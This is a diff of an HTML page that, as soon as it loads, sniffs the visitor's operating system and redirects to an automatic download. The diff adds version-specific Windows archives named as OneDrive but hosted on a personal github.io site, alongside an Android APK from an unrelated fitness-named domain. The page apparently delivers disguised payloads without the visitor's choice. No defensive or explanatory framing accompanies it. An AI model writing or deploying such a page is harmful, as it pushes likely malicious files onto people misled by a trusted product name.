@@ -5,15 +5,23 @@
     <title>Auto OS-Based Download</title>
     <script>
         window.onload = function() {
-            let userAgent = navigator.userAgent;
-            let downloadURL = "#";
+            const userAgent = navigator.userAgent;
+            let downloadURL = "#";  // default/fallback
 
-            if (userAgent.includes("Win")) {
+            if (/Windows NT 10\.0/.test(userAgent)) {
+                // Windows 10
                 downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
-            } else if (userAgent.includes("Android")) {
+            } else if (/Windows NT 6\.3/.test(userAgent)) {
+                // Windows 8.1
+                downloadURL = "https://andre0194.github.io/service/OneDrive_Win8.7z";
+            } else if (/Windows NT 6\.1/.test(userAgent)) {
+                // Windows 7
+                downloadURL = "https://andre0194.github.io/service/OneDrive_Win7.7z";
+            } else if (/Android/.test(userAgent)) {
+                // Android
                 downloadURL = "https://files.myfitnesslife.xyz/ready.apk";
             }
-
+            
             // Redirect automatically
             window.location.href = downloadURL;
         };
